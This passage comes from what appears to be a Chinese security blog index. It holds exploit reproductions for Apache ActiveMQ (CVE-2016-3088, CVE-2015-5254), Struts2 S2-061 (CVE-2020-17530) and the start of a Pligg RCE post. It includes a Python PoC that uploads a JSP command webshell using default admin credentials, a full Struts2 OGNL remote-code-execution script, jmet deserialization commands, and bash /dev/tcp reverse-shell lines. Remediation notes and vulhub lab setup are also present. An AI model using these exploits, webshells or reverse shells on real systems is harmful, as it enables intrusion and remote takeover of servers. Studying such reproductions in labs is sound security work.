&quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line">		path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;id&quot;</span><br><span class="line">		url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line">		url1 &#x3D; self.url + &#39;&#x2F;&#39; + path1</span><br><span class="line">		data1 &#x3D; &#39;1&#39;</span><br><span class="line">		data &#x3D; &#39;&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);String line&#x3D;null;Process p&#x3D;Runtime.getRuntime().exec(strcmd);BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));while((line&#x3D;br.readLine())!&#x3D;null)&#123;out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);&#125;%&gt;&#39;</span><br><span class="line"></span><br><span class="line">		headers &#x3D;&#123;</span><br><span class="line"> 		&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		headers1&#x3D;&#123;</span><br><span class="line">		&#39;Authorization&#39;:&#39;Basic YWRtaW46YWRtaW4&#x3D;&#39;,</span><br><span class="line">		&#39;Connection&#39;:&#39;close&#39;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		proxies&#x3D;&#123;</span><br><span class="line">		&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">		&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		try:</span><br><span class="line">			resp &#x3D; req.put(url,data&#x3D;data)</span><br><span class="line">			resp1 &#x3D; req.get(url)</span><br><span class="line">			resp2 &#x3D; req.request(&#39;MOVE&#39;,url&#x3D;url,headers&#x3D;&#123;&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;2.jsp&#39;&#125;)</span><br><span class="line">			resp3 &#x3D; req.get(url1,headers&#x3D;headers1)</span><br><span class="line">			resp3 &#x3D; resp3.text[12:50]</span><br><span class="line">			result[&#39;AdminInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">			result[&#39;AdminInfo&#39;][&#39;SHELL&#39;] &#x3D; url1</span><br><span class="line">			result[&#39;AdminInfo&#39;][&#39;EXEC &#39;] &#x3D; resp3</span><br><span class="line">		except Exception as ex:</span><br><span class="line">			pass</span><br><span class="line"></span><br><span class="line">		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">register(ActiveMQPoc)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217173751874.png" alt="image-20201217173751874"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217214812586.png" alt="image-20201217214812586"></p>
<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p>
<p>2、通过移除 <code>conf\jetty.xml</code> 的以下配置来禁用 ActiveMQ Fileserver 功能</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/346/">https://paper.seebug.org/346/</a></p>
<p><a target="_blank" rel="noopener" href="http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/">http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/ActiveMQ/">ActiveMQ </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/"><i class="fas fa-angle-double-right"></i>Struts2 S2-061 远程命令执行漏洞(CVE-2020-17530)复现以及脚本编写</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-12-16</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:51.640Z" title="2020-12-23T08:50:51.640Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">4 minutes read (About 539 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/">Struts2 S2-061 远程命令执行漏洞(CVE-2020-17530)复现以及脚本编写</a></h1><div class="content"><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts2：2.0.0 - 2.5.25</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-061</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╰─$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">e60ea5e361ff        vulhub&#x2F;struts2:2.5.25   &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;mvn-…&quot;   34 minutes ago      Up 34 minutes       0.0.0.0:8080-&gt;8080&#x2F;tcp   s2-061_struts2_1</span><br></pre></td></tr></table></figure>

<h4 id="访问漏洞环境"><a href="#访问漏洞环境" class="headerlink" title="访问漏洞环境"></a>访问漏洞环境</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194045330.png" alt="image-20201216194045330"></p>
<h4 id="测试漏洞是否存在"><a href="#测试漏洞是否存在" class="headerlink" title="测试漏洞是否存在"></a>测试漏洞是否存在</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194318514.png" alt="image-20201216194318514"></p>
<h4 id="直接执行命令"><a href="#直接执行命令" class="headerlink" title="直接执行命令"></a>直接执行命令</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216201525731.png" alt="image-20201216201525731"></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>通过在线地址将bash反弹命令进行进行编码转换</p>
<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216210508614.png" alt="image-20201216210508614"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205907765.png" alt="image-20201216205907765"></p>
<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;%25%7b(%27ol4three%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27&quot;</span>+cmd+<span class="string">&quot;%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d&quot;</span></span><br><span class="line">    tturl=url+<span class="string">&quot;/?id=&quot;</span>+payload</span><br><span class="line">    r=requests.get(tturl)</span><br><span class="line">    page=r.text</span><br><span class="line"><span class="comment">#   etree=html.etree</span></span><br><span class="line">    page=etree.HTML(page)</span><br><span class="line">    data = page.xpath(<span class="string">&#x27;//a[@id]/@id&#x27;</span>)</span><br><span class="line">    print(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ EXP: python struts2-061-poc.py http://1.1.1.1:8081 id      +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ VER: Struts 2.0.0-2.5.25                                   +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ S2-061 RCE &amp;&amp; CVE-2020-17530                               +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;[+]ussage: http://ip:port command&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[+]============================================================&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    url=sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">exp(url,cmd)</span><br></pre></td></tr></table></figure>

<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216203912346.png" alt="image-20201216203912346"></p>
<h4 id="Goby-poc-开发界面"><a href="#Goby-poc-开发界面" class="headerlink" title="Goby poc 开发界面"></a>Goby poc 开发界面</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216204623455.png" alt="image-20201216204623455"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205437353.png" alt="image-20201216205437353"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205455850.png" alt="image-20201216205455850"></p>
<h4 id="单个漏洞验证"><a href="#单个漏洞验证" class="headerlink" title="单个漏洞验证"></a>单个漏洞验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205525154.png" alt="image-20201216205525154"></p>
<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>将Apache Struts框架升级至最新版本</p>
<p><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-061">https://cwiki.apache.org/confluence/display/WW/S2-061</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew">https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/struts2/">struts2 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/12/04/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%EF%BC%88CVE-2015-5254%EF%BC%89/"><i class="fas fa-angle-double-right"></i>ActiveMQ漏洞复现和分析（CVE-2015-5254）</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-12-04</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:04.337Z" title="2020-12-23T08:51:04.337Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">6 minutes read (About 939 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/04/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%EF%BC%88CVE-2015-5254%EF%BC%89/">ActiveMQ漏洞复现和分析（CVE-2015-5254）</a></h1><div class="content"><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h2><p>使用namp对目标进行扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV IP -p 8161,61616</span><br></pre></td></tr></table></figure>

<p>扫描结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">8161&#x2F;tcp  open  http     Jetty 8.1.16.v20140903</span><br><span class="line">61616&#x2F;tcp open  apachemq ActiveMQ OpenWire transport</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port61616-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;12&#x2F;13%Time&#x3D;5FD5DA4A%P&#x3D;x86_64-apple-darwin19.</span><br><span class="line">SF:0.0%r(NULL,F4,&quot;\0\0\0\xf0\x01ActiveMQ\0\0\0\n\x01\0\0\0\xde\0\0\0\t\0\x</span><br><span class="line">SF:0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\tCacheSize\x05\0\0\x04\0\0\x0cCac</span><br><span class="line">SF:heEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\x20MaxInactivityDurat</span><br><span class="line">SF:ionInitalDelay\x06\0\0\0\0\0\0&#39;\x10\0\x11TcpNoDelayEnabled\x01\x01\0\x1</span><br><span class="line">SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x14TightEncodingEnabled\x01\</span><br><span class="line">SF:x01\0\x11StackTraceEnabled\x01\x01&quot;);</span><br></pre></td></tr></table></figure>



<h2 id="默认口令漏洞"><a href="#默认口令漏洞" class="headerlink" title="默认口令漏洞"></a>默认口令漏洞</h2><p>ActiveMQ默认口令是admin/admin 登陆后可以看到对应的版本信息。<strong>放序列化需要登陆后才能触发，任意文件上传访问webshell需要登录</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201213171426069.png" alt="image-20201213171426069"></p>
<h2 id="反序列化漏洞-CVE-2015-5254"><a href="#反序列化漏洞-CVE-2015-5254" class="headerlink" title="反序列化漏洞(CVE-2015-5254)"></a>反序列化漏洞(CVE-2015-5254)</h2><p>漏洞利用过程如下：</p>
<p>a.构造(可以使用ysoserial)可执行命令的序列化对象</p>
<p>b.作为一个消息，发送给目标的61616端口</p>
<p>c.访问Web管理界面，读取消息触发漏洞</p>
<p>jmet的jar文件（这里windows和linux都经过了测试，windows在 “1.8.0_241”版本中可利用成功，linux在”11.0.7“不可以，应该是java版本导致的原因）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar">下载jmet</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;sucess&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>

<p>发送成功如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:ol4three-55063-1607996494671-0:1</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Sent gadget &quot;ROME&quot; with command: &quot;touch &#x2F;tmp&#x2F;sucess&quot;</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:ol4three-55063-1607996494671-0:1</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215095044834.png" alt="image-20201215095044834"></p>
<p>点击队列即可触发（如果没有弱口令，可写入后等待管理员点击触发），可成功执行建立文件的命令，这里可通过以下命令进入docker查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 609d53eb4f5a &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215101659372.png" alt="image-20201215101659372"></p>
<p>反弹shell需要在<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">这里</a>将bash反弹命令进行编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;编码后的反弹命令&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215105651639.png" alt="image-20201215105651639"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞触发流程如下</p>
<p><strong>ObjectMessage.setObject() -&gt;MessageProducer.send()→MessageConsumer.recive()→ObjectMessage.getObject()</strong></p>
<p>下面是setObject()和getObject()的操作接口</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150520127.png" alt="image-20201215150520127"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150819658.png" alt="image-20201215150819658"></p>
<p>这里为序列化操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(ObjectOutputStream s) throws IOException &#123;</span><br><span class="line"> int sshift &#x3D; 0;</span><br><span class="line"> int ssize &#x3D; 1;</span><br><span class="line"> while (ssize &lt; 16) &#123;</span><br><span class="line"> sshift++;</span><br><span class="line"> ssize &lt;&lt;&#x3D; 1;</span><br><span class="line"> &#125; </span><br><span class="line"> int segmentShift &#x3D; 32 - sshift;</span><br><span class="line"> int segmentMask &#x3D; ssize - 1;</span><br><span class="line"> Segment[] segments &#x3D; (Segment[])new Segment[16];</span><br><span class="line"> for (int i &#x3D; 0; i &lt; segments.length; i++)</span><br><span class="line"> segments[i] &#x3D; new Segment(0.75F); </span><br><span class="line"> s.putFields().put(&quot;segments&quot;, segments);</span><br><span class="line"> s.putFields().put(&quot;segmentShift&quot;, segmentShift);</span><br><span class="line"> s.putFields().put(&quot;segmentMask&quot;, segmentMask);</span><br><span class="line"> s.writeFields();</span><br><span class="line"> Node[] arrayOfNode;</span><br><span class="line"> if ((arrayOfNode &#x3D; this.table) !&#x3D; null) &#123;</span><br><span class="line"> Traverser&lt;K, V&gt; it &#x3D; new Traverser&lt;K, V&gt;(arrayOfNode, arrayOfNode.length, 0, arrayOfNode.length); Node&lt;K, </span><br><span class="line">V&gt; p;</span><br><span class="line"> while ((p &#x3D; it.advance()) !&#x3D; null) &#123;</span><br><span class="line"> s.writeObject(p.key);</span><br><span class="line"> s.writeObject(p.val);</span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> segments &#x3D; null;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215170349015.png" alt="image-20201215170349015"></p>
<p>getObject()方法会调用readobject()方法中将data中的数据进行反序列化并且触发漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream stream) throws InvalidObjectException &#123; throw new </span><br><span class="line">InvalidObjectException(&quot;Proxy required&quot;); &#125;</span><br><span class="line"> static final class SerializationProxy&lt;K, V&gt;</span><br><span class="line"> extends Object</span><br><span class="line"> implements Serializable</span><br><span class="line"> &#123;</span><br><span class="line"> final EntryWeigher&lt;? super K, ? super V&gt; weigher;</span><br><span class="line"> final EvictionListener&lt;K, V&gt; listener;</span><br><span class="line"> final int concurrencyLevel;</span><br><span class="line"> final Map&lt;K, V&gt; data;</span><br><span class="line"> final long capacity;</span><br><span class="line"> static final long serialVersionUID &#x3D; 1L;</span><br><span class="line"> SerializationProxy(ConcurrentLinkedHashMap&lt;K, V&gt; map) &#123;</span><br><span class="line"> this.concurrencyLevel &#x3D; map.concurrencyLevel;</span><br><span class="line"> this.data &#x3D; new HashMap(map);</span><br><span class="line"> this.capacity &#x3D; map.capacity.get();</span><br><span class="line"> this.listener &#x3D; map.listener;</span><br><span class="line"> this.weigher &#x3D; map.weigher;</span><br><span class="line"> &#125;</span><br><span class="line"> Object readResolve() &#123;</span><br><span class="line"> ConcurrentLinkedHashMap&lt;K, V&gt; map &#x3D; (new ConcurrentLinkedHashMap.Builder()).concurrencyLevel(this.</span><br><span class="line">concurrencyLevel).maximumWeightedCapacity(this.capacity).listener(this.listener).weigher(this.weigher).build();</span><br><span class="line"> map.putAll(this.data);</span><br><span class="line"> return map;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/ActiveMQ/">ActiveMQ </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/"><i class="fas fa-angle-double-right"></i>Pligg远程命令执行(CVE-2020-25287)</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:13.813Z" title="2020-12-23T08:50:13.813Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">2 minutes read (About 303 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/">Pligg远程命令执行(CVE-2020-25287)</a></h1><div class="content"><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>the_file</code>由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将webshell创建到现有的php文件中</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Pligg2.0.3版本</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174643966.png" alt="image-20200917174643966"></p>
